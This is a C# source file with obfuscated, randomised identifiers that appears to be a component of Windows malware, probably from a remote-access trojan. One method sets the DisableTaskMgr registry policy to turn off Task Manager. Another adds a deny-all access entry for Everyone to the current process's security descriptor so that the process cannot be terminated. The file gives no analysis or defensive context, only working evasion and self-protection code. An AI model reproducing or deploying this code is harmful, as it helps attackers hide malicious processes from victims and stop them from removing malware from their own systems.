using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace NebZuOsqGKsBdvX;

internal sealed class RpHGXTOgyyTS
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr qWmNPKaUiOFHjV, int lpBNsoSwbQiiRdpq, [Out] byte[] nHwOjbRycRTxFpsR, uint skgOtwVDMHM, out uint VXrczFHEbTAPHD);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr DveOaizShKA, int ixjkIKlBmrovOr, [In] byte[] ALzuloUbSWEVSU);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void KVPdCGEEcQpD(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (bool_0 && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor cpnXBNMZPXho(IntPtr intptr_0)
	{
		byte[] nHwOjbRycRTxFpsR = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, nHwOjbRycRTxFpsR, 0u, out var VXrczFHEbTAPHD);
		if ((long)VXrczFHEbTAPHD > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, nHwOjbRycRTxFpsR = new byte[VXrczFHEbTAPHD], VXrczFHEbTAPHD, out VXrczFHEbTAPHD))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(nHwOjbRycRTxFpsR, 0);
	}

	private void RoAoXDgCipJTQ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void esAPrygzUSC()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = cpnXBNMZPXho(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		RoAoXDgCipJTQ(currentProcess, rawSecurityDescriptor);
	}
}
